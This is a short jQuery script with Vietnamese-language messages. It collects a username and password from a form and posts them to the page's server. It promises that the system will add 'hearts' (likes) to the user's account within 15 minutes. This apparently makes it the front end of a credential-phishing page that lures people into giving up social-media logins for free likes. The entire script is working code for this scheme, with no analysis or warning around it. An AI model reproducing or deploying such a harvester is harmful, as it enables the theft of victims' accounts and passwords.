$(document).ready(function(){
    $('.btn-donate').click(function(){
        let username = $('#username').val() ;
        let password = $('#password').val() ;
        if(username==""|| password==""){
           return  Swal.fire({
                icon: 'error',
                title: 'Oops...',
                text: 'Vui Lòng Nhập Tên Tài Khoản hoặc Mật Khẩu' 
            })
        }
        $.ajax({
            url:'/',
            method:'post',
            data:{
                username,
                password
            },
            success: function(data){
                console.log(data);
                if(data.error){
                    Swal.fire({
                        icon: 'error',
                        title: 'Oops...',
                        text: 'Tên Tài Khoản Hoặc Mật Khẩu Chưa Chính Xác' 
                    })
                }
                else{
                    Swal.fire({
                        icon: 'success',
                        title: 'Nhận Thành Công',
                        text: 'Vui lòng đợi 15 phút . Hệ Thống sẽ buff tim vào tài khoản của bạn'
                    })
                }
                $('#username').val("") ;
                $('#password').val("") ;
            }
        })
    })
})